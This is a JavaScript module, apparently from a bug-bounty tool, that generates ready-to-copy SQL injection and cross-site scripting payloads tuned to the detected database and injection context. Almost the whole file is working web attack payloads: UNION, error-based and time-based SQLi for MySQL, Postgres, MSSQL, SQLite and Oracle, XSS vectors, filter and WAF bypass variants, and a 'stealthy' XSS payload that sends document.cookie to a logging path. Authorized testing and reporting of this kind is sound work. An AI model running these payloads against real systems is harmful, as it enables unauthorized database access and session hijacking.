/**
 * Bug-bounty payload generator for SQLi and XSS findings.
 *
 * Produces a ranked list of ready-to-copy payloads tailored to the finding
 * (DB flavour hint, injection context, parameter, URL) so the operator can
 * paste them straight into Burp/curl/browser for PoC in a report.
 *
 * Non-destructive by design: no DROP/DELETE/UPDATE, no long sleeps (>5s),
 * no data exfil beyond version()/current_user, no XSS payloads that
 * beacon to third-party hosts.
 */

const clamp = (s, n = 400) => String(s || "").slice(0, n);

function detectDbFlavour(finding, proof) {
  const hay = `${finding.evidence || ""}\n${proof?.evidence || ""}\n${proof?.response || ""}`.toLowerCase();
  if (/mysql|mariadb|you have an error in your sql syntax/.test(hay)) return "mysql";
  if (/postgres|pg_|pgsql|syntax error at or near/.test(hay)) return "postgres";
  if (/microsoft sql|mssql|sql server|unclosed quotation mark/.test(hay)) return "mssql";
  if (/sqlite|sqlite3\./.test(hay)) return "sqlite";
  if (/ora-\d{4,5}|oracle/.test(hay)) return "oracle";
  return "generic";
}

function detectXssContext(finding, proof) {
  const hay = `${finding.evidence || ""}\n${proof?.evidence || ""}\n${proof?.response || ""}`;
  if (/<script[^>]*>[^<]*YORU_MARK|=\s*["']?[^"'>]*YORU_MARK/.test(hay)) return "attribute";
  if (/<script[^>]*>[\s\S]*YORU_MARK/.test(hay)) return "script";
  if (/YORU_MARK/.test(hay)) return "html";
  return "unknown";
}

/* ---------- SQLi ---------- */

function sqliPayloads(flavour) {
  const common = [
    { label: "Boolean TRUE",  payload: "' OR '1'='1'-- -" },
    { label: "Boolean FALSE", payload: "' OR '1'='2'-- -" },
    { label: "Numeric TRUE",  payload: "1 OR 1=1-- -" },
    { label: "Numeric FALSE", payload: "1 AND 1=2-- -" },
    { label: "Quote break",   payload: "'\"`)) OR ((1=1-- -" },
    { label: "Comment probe", payload: "'/*!50000 OR 1=1*/-- -" },
  ];
  const byDb = {
    mysql: [
      { label: "Version (UNION)",   payload: "' UNION SELECT NULL,version(),NULL-- -" },
      { label: "User (UNION)",      payload: "' UNION SELECT NULL,current_user(),NULL-- -" },
      { label: "Error-based",       payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -" },
      { label: "Time-based (5s)",   payload: "' OR SLEEP(5)-- -" },
      { label: "Time-based (IF)",   payload: "' OR IF(1=1,SLEEP(5),0)-- -" },
      { label: "Stacked (read)",    payload: "'; SELECT version();-- -" },
    ],
    postgres: [
      { label: "Version (UNION)",   payload: "' UNION SELECT NULL,version(),NULL-- -" },
      { label: "User (UNION)",      payload: "' UNION SELECT NULL,current_user,NULL-- -" },
      { label: "Error-based",       payload: "' AND 1=CAST(version() AS int)-- -" },
      { label: "Time-based (5s)",   payload: "'; SELECT pg_sleep(5)-- -" },
      { label: "Boolean+substr",    payload: "' AND substr(version(),1,10)=substr(version(),1,10)-- -" },
    ],
    mssql: [
      { label: "Version",           payload: "' UNION SELECT NULL,@@version,NULL-- -" },
      { label: "User",              payload: "' UNION SELECT NULL,SYSTEM_USER,NULL-- -" },
      { label: "Time-based (5s)",   payload: "'; WAITFOR DELAY '0:0:5'-- -" },
      { label: "Error-based",       payload: "' AND 1=CONVERT(int,@@version)-- -" },
    ],
    sqlite: [
      { label: "Version",           payload: "' UNION SELECT NULL,sqlite_version(),NULL-- -" },
      { label: "Table probe",       payload: "' UNION SELECT NULL,name,NULL FROM sqlite_master-- -" },
    ],
    oracle: [
      { label: "Version",           payload: "' UNION SELECT NULL,banner,NULL FROM v$version-- -" },
      { label: "User",              payload: "' UNION SELECT NULL,USER,NULL FROM dual-- -" },
      { label: "Time-based",        payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -" },
    ],
    generic: [
      { label: "Version (UNION)",   payload: "' UNION SELECT NULL,@@version,NULL-- -" },
      { label: "Time-based (5s)",   payload: "' OR SLEEP(5)-- -" },
      { label: "Boolean substring", payload: "' AND substr((SELECT 'a'),1,1)='a'-- -" },
    ],
  };
  const encoders = (p) => [
    { label: "URL-encoded", payload: encodeURIComponent(p) },
    { label: "Double URL-encoded", payload: encodeURIComponent(encodeURIComponent(p)) },
  ];
  const primary = [...common, ...(byDb[flavour] || byDb.generic)];
  const escaped = encoders(primary[0].payload).map((e) => ({ ...e, payload: e.payload }));
  return { primary, encoded: escaped };
}

/* ---------- XSS ---------- */

function xssPayloads(context) {
  const html = [
    { label: "Classic <script>",        payload: `<script>alert(1)</script>` },
    { label: "SVG onload",              payload: `<svg/onload=alert(1)>` },
    { label: "IMG onerror",             payload: `<img src=x onerror=alert(1)>` },
    { label: "IFRAME srcdoc",           payload: `<iframe srcdoc="<script>alert(1)</script>"></iframe>` },
    { label: "Details ontoggle",        payload: `<details open ontoggle=alert(1)>` },
    { label: "Body onload",             payload: `"><body onload=alert(1)>` },
    { label: "Marquee onstart",         payload: `<marquee onstart=alert(1)>` },
  ];
  const attribute = [
    { label: "Break out of value",      payload: `"><script>alert(1)</script>` },
    { label: "Event handler",           payload: `" autofocus onfocus=alert(1) x="` },
    { label: "javascript: URI",         payload: `javascript:alert(1)` },
    { label: "Single-quoted context",   payload: `' autofocus onfocus=alert(1) x='` },
    { label: "Unquoted attr",           payload: ` onmouseover=alert(1) x=` },
  ];
  const script = [
    { label: "String break",            payload: `';alert(1);//` },
    { label: "Double-quote break",      payload: `";alert(1);//` },
    { label: "Backtick template",       payload: "`;alert(1);//" },
    { label: "Close tag pivot",         payload: `</script><script>alert(1)</script>` },
  ];
  const bypass = [
    { label: "Case variant",            payload: `<ScRiPt>alert(1)</ScRiPt>` },
    { label: "Nested tag strip",        payload: `<scr<script>ipt>alert(1)</scr</script>ipt>` },
    { label: "HTML entities",           payload: `&#60;script&#62;alert(1)&#60;/script&#62;` },
    { label: "No parentheses",          payload: `<svg><script>alert\`1\`</script>` },
    { label: "String.fromCharCode",     payload: `<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">` },
    { label: "Data URI",                payload: `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>` },
  ];
  const stealthy = [
    { label: "Cookie exfil (self-log)", payload: `<img src=x onerror="new Image().src='/log?c='+document.cookie">` },
    { label: "DOM read-only probe",     payload: `<script>document.title='XSS-'+document.domain</script>` },
  ];
  const map = { html, attribute, script, unknown: html };
  return { primary: map[context] || html, bypass, stealthy };
}

/* ---------- render ---------- */

function block(title, items) {
  const lines = [`### ${title}`, ""];
  for (const p of items) lines.push(`- **${p.label}** — \`${clamp(p.payload)}\``);
  return lines.join("\n");
}

/**
 * Build a markdown "Ready-to-use payloads" section + a plain-text payload
 * dump for the finding. Returns null for finding types we don't cover.
 *
 * @returns {null | { markdown: string, plain: string, payloads: string[] }}
 */
export function generatePayloadsFor(finding, proof) {
  const t = finding.type || "";
  if (/^sqli/.test(t)) {
    const flavour = detectDbFlavour(finding, proof);
    const { primary, encoded } = sqliPayloads(flavour);
    const md = [
      `## Ready-to-use payloads (SQLi)`,
      ``,
      `Detected flavour: **${flavour}**${finding.param ? ` · param: \`${finding.param}\`` : ""}${finding.url ? ` · url: ${finding.url}` : ""}`,
      ``,
      `> Non-destructive set. No DROP/UPDATE/DELETE. Sleeps capped at 5s.`,
      ``,
      block("Primary", primary),
      ``,
      block("Encoded (WAF bypass)", encoded),
    ].join("\n");
    const all = [...primary, ...encoded];
    return { markdown: md, plain: all.map((p) => `# ${p.label}\n${p.payload}`).join("\n\n"), payloads: all.map((p) => p.payload) };
  }
  if (/^xss/.test(t)) {
    const ctx = detectXssContext(finding, proof);
    const { primary, bypass, stealthy } = xssPayloads(ctx);
    const md = [
      `## Ready-to-use payloads (XSS)`,
      ``,
      `Detected context: **${ctx}**${finding.param ? ` · param: \`${finding.param}\`` : ""}${finding.url ? ` · url: ${finding.url}` : ""}`,
      ``,
      `> Use \`alert(1)\` PoC only. Do not exfil real user data to third-party hosts.`,
      ``,
      block("Primary", primary),
      ``,
      block("Filter bypass", bypass),
      ``,
      block("Stealthy PoC", stealthy),
    ].join("\n");
    const all = [...primary, ...bypass, ...stealthy];
    return { markdown: md, plain: all.map((p) => `# ${p.label}\n${p.payload}`).join("\n\n"), payloads: all.map((p) => p.payload) };
  }
  return null;
}
